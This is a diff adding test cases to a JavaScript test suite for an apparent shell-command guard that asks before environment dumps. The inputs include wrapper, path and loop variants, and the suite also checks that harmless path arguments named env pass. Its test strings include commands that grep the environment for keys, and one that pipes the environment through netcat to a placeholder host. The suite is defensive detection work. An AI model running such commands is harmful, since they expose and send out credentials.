@@ -208,11 +208,29 @@ describe("blocked: an environment dump — the block and its rewrites", () => {
     "timeout 5 env | grep KEY", "nice -n 10 env | grep KEY", "sudo -u root env | grep K", "xargs env",
     "eval 'env | grep K'", "{ env | grep K; }", "if true; then env | grep K; fi", "\\env | grep K",
     "/opt/homebrew/bin/env | grep K", "~/bin/env | grep K", "ls -a env",
+    // Any path to the binary asks, not only one ending in bin/.
+    "/opt/env | grep K", "~/env | grep K", "./env | grep K", "./scripts/printenv > out",
     // A quote right before env|… is exempt only when a search tool owns it.
     "bash -lc 'env|grep K'", "docker exec app bash -lc 'env|grep -i key'", "su - u -c 'env|grep X'",
     "eval \"env|nc x 1\"", "watch 'env|grep K'", "kubectl exec p -- bash -lc \"env|sort\"",
   ];
   for (const cmd of stillAsk) test(`still asks: ${cmd}`, () => assert.ok(isAsk(bash(cmd)), `should ask: ${cmd}`));
+  stillAsk.push(
+    "sudo /opt/env | x", "timeout 5 /opt/env | x", "a && /opt/env", "$HOME/x/env | x",
+    "{ /opt/env | grep K; }", "if true; then /opt/env | grep K; fi", "for i in 1; do ./env | grep K; done",
+    "! /opt/env | grep K", "ssh host /opt/env | grep K", "busybox /opt/env",
+  );
+  for (const cmd of stillAsk.slice(-10)) test(`a path run as a command asks: ${cmd}`, () => assert.ok(isAsk(bash(cmd))));
+
+  // A path to a directory named env, as an argument, is the noise this PR
+  // cuts: only a path where a command starts, or after a wrapper, asks.
+  for (const cmd of ["ls /opt/env", "ls ~/src/site/env", "ls apps/repo/env", "rm -rf ../env", "du -sh ./env | sort", "cd ./env"]) {
+    test(`a path argument passes: ${cmd}`, () => {
+      const r = bash(cmd);
+      assert.notEqual(r.code, BLOCKED, cmd);
+      assert.ok(!isAsk(r), `should not ask: ${cmd}`);
+    });
+  }
   for (const [name, cmd] of rewrites) {
     test(`the rewrite passes: ${name}`, () => assert.ok(isAllow(bash(cmd)), `should allow: ${cmd}`));
   }
